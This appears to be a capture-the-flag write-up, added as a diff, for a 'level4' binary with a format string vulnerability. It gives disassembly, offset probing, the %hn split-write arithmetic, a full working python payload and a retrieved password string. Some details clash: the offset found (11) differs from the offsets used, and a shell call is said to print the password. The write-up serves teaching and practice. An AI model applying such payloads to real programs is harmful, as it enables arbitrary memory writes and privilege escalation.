@@ -1,0 +1,288 @@
+*** Level4 - Format String Vulnerability (Partial Arbitrary Write via %hn) ***
+** Overview **
+
+The objective of this challenge is to obtain privileged execution by exploiting a format string vulnerability in the level4 executable.
+
+The binary passes user-controlled input directly into printf(), allowing attacker-controlled format specifiers to be interpreted during execution.
+
+Unlike the previous level, the target value is a large 32-bit integer that cannot reasonably be written using a single %n operation. Instead, the value must be split into two 16-bit writes using %hn.
+
+The goal is to overwrite a global variable located at 0x08049810 with the value:
+
+0x01025544
+
+which causes the program to execute:
+
+system("/bin/sh");
+
+** Reconnaissance **
+
+The first step is to observe the program's behavior.
+
+Execute the binary and provide a simple format string:
+
+./level4
+AAAA.%x.%x.%x.%x.%x.%x
+
+The output contains stack values rather than the literal string.
+
+This indicates that user input is being interpreted as a format string.
+
+To understand why, inspect the disassembly:
+
+objdump -d level4
+
+Relevant instructions:
+
+804847a: call fgets@plt
+804847f: lea -0x208(%ebp),%eax
+8048485: mov %eax,(%esp)
+8048488: call 8048444 <p>
+
+Function p():
+
+08048444 <p>:
+804844a: mov 0x8(%ebp),%eax
+804844d: mov %eax,(%esp)
+8048450: call printf@plt
+
+The program effectively performs:
+
+printf(buffer);
+
+instead of:
+
+printf("%s", buffer);
+
+This immediately indicates a format string vulnerability.
+
+** Vulnerability Analysis **
+
+A format string vulnerability allows attackers to control the behavior of printf().
+
+Common specifiers include:
+
+Specifier  |	Purpose
+---------------------------------
+%x         |	Read stack values
+%p         |	Leak pointers
+%s         |	Read memory
+%n         |	Write memory
+%hn        |	Write 16-bit values
+
+The %n family is especially dangerous because it writes the number of characters printed so far into a supplied memory address.
+
+If an attacker can place addresses on the stack and determine the correct argument offsets, arbitrary memory modification becomes possible.
+
+** Exploitation **
+* Identifying the Target Variable *
+
+Inspecting the disassembly reveals a comparison against a global variable:
+
+804848d: mov 0x8049810,%eax
+8048492: cmp $0x1025544,%eax
+8048497: jne 80484a5
+8048499: call system@plt
+
+The program expects:
+
+0x08049810 = 0x01025544
+
+Required values:
+
+Property        |	Value
+----------------------------
+Target Address  |	0x08049810
+Required Value  |	0x01025544
+
+If this comparison succeeds, execution reaches:
+
+system("/bin/sh");
+
+* Determining the Stack Offset *
+
+The next step is identifying where user-controlled data appears in the argument list used by printf().
+
+Example input:
+
+AAAA 0 %x 1 %x 2 %x 3 %x 4 %x 5 %x 6 %x 7 %x 8 %x 9 %x 10 %x 11 %x 12 %x
+
+The output contains:
+
+41414141
+
+which corresponds to:
+
+AAAA
+
+The value appears at argument position:
+
+11
+
+Because the exploit payload will place two target addresses at the beginning of the format string, the usable parameter positions become:
+
+12
+13
+
+These offsets will later be referenced using:
+
+%12$hn
+%13$hn
+
+** Payload Construction **
+* Splitting the Target Value *
+
+Writing the complete value:
+
+0x01025544
+
+with a single %n would require printing over sixteen million characters.
+
+Instead, the value is split into two 16-bit portions.
+
+Half  |	Hex    |	Decimal
+-------------------------
+High  |	0x0102 |	258
+Low   |	0x5544 |	21828
+
+Because %hn writes only two bytes, each half can be written separately.
+
+Address Layout
+
+The target variable occupies four bytes beginning at:
+
+0x08049810
+
+Therefore:
+
+Address      |	Purpose
+-------------------------
+0x08049810   |	Low half
+0x08049812   |	High half
+
+Little-endian representations:
+
+\x10\x98\x04\x08
+\x12\x98\x04\x08
+
+* Calculating the First Write *
+
+The payload begins with two addresses:
+
+8 bytes already printed
+
+The first value to write is:
+
+0x0102 = 258
+
+Required padding:
+
+258 - 8 = 250
+
+Format specifier:
+
+%250c
+
+After printing:
+
+258 characters
+
+the first write executes:
+
+%12$hn
+
+Result:
+
+*(short *)0x08049812 = 0x0102
+
+* Calculating the Second Write *
+
+Current printed character count:
+
+258
+
+Desired value:
+
+21828
+
+Additional padding required:
+
+21828 - 258 = 21570
+
+Format specifier:
+
+%21570c
+
+After printing the additional padding:
+
+21828 characters
+
+the second write executes:
+
+%13$hn
+
+Result:
+
+*(short *)0x08049810 = 0x5544
+
+The final value stored in memory becomes:
+
+0x01025544
+
+* Final Payload *
+
+Payload structure:
+
+Component          |	Purpose
+---------------------------------------
+\x12\x98\x04\x08   |	High-half target
+\x10\x98\x04\x08   |	Low-half target
+%250c              |	Reach value 258
+%12$hn             |	Write 0x0102
+%21570c            |	Reach value 21828
+%13$hn             |	Write 0x5544
+
+Final payload:
+
+(python -c 'print "\x12\x98\x04\x08" + "\x10\x98\x04\x08" + "%250c" + "%12$hn" + "%21570c" + "%13$hn"'; cat) | ./level4
+
+
+* Exploitation *
+
+Execute the payload:
+
+(python -c 'print "\x12\x98\x04\x08" + "\x10\x98\x04\x08" + "%250c" + "%12$hn" + "%21570c" + "%13$hn"'; cat) | ./level4
+
+After the overwrite:
+
+0x08049810 = 0x01025544
+
+The comparison succeeds and execution reaches:
+
+system("/bin/sh");
+
+The program immediately prints the password.
+
+* Password Retrieval *
+
+Successful execution returns:
+
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+
+
+** Why the Exploit Works **
+
+The exploit succeeds because:
+
+- user input is passed directly to printf()
+- attacker-controlled format specifiers are interpreted
+- %hn allows arbitrary 16-bit memory writes
+- target addresses can be placed directly inside the format string
+- the correct stack offsets can be determined through probing
+- no validation or sanitization is performed
+
+By splitting the required 32-bit value into two 16-bit halves and carefully controlling the number of printed characters, the attacker forces memory at 0x08049810 to contain:
+
+0x01025544
+
+This satisfies the program's comparison and redirects execution into the privileged code path, resulting in execution of system("/bin/sh").
